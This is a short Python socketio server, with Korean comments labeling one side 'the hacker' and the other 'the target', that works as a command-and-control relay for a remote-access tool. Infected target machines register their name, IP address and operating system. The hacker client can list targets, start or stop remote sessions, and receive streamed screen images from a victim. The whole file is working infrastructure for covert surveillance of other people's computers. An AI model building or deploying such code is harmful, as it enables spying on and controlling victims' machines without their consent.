from socketio import Server, WSGIApp

sio = Server()
app = WSGIApp(sio)

targets = []

@sio.event
def connect(sid, environ, auth):
  print('connect ', sid)
  sio.emit('info', room=sid)

@sio.event
def disconnect(sid):
  global targets
  print('disconnect ', sid)
  for i, v in enumerate(targets):
    if v['sid'] == sid:
      targets.pop(i)
      sio.emit('del target', {'sid': sid})
      break


# 해커로부터 오는 요청
@sio.on('target list')
def getTargetList(sid):
  sio.emit('t list', {'targets': targets}, room=sid)

@sio.on('remote req')
def remoteReq(sid, data):
  sio.emit('remote start', {'hacker': sid}, room=data['target'])

@sio.on('stop remote')
def stopStream(sid, data):
  sio.emit('stop remote', room=data['target'])


# 타겟으로부터 오는 요청
@sio.on('my info')
def setTargetInfo(sid, data):
  print(data['name'])
  targets.append({
    'name': data['name'],
    'ip': data['ip'],
    'os': data['os'],
    'sid': sid
  })
  print(targets)

@sio.on('stream monitor')
def stream(sid, data):
  sio.emit('stream', {'src': data['src']}, room=data['hacker'])